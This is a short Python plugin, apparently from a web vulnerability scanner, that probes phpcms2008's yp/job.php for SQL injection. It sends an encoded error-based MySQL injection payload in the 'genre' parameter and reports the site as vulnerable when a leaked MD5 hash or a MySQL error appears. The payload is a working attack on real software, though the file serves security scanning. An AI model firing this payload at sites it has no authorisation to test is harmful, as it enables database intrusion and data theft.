#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *
def run_domain(http,ob):
    try:  
        result=[]                               
        detail=u''
        detail=detail.encode('utf8')
        domain=ob['domain']
        url="yp/job.php?action=list&station=1&genre=0%2527%20and%20(select%201%20from%20(select%20count(*),concat(md5(333),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23"
        geturl="%s://%s%s%s"%(ob['scheme'],domain,ob['base_path'],url)
        response,content=requestUrl(http,geturl,ob['task_id'],ob['domain_id'])
        if content.find("310dcbbf4cce62f762a2aaa148d556bd1")>=0 or content.find("MySQL Query Error")>=0:
            request = getRequest(geturl)
            response = getResponse(response)
            result.append(getRecord(ob,ob['scheme']+"://"+domain,ob['level'],detail,request,response))
    except Exception, e:
        logging.getLogger().error("File:phpcms2008 job.phpsqlinjecitonscript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:phpcms2008 job.phpsqlinjecitonscript.py, run_domain function :" + str(e))
    return result

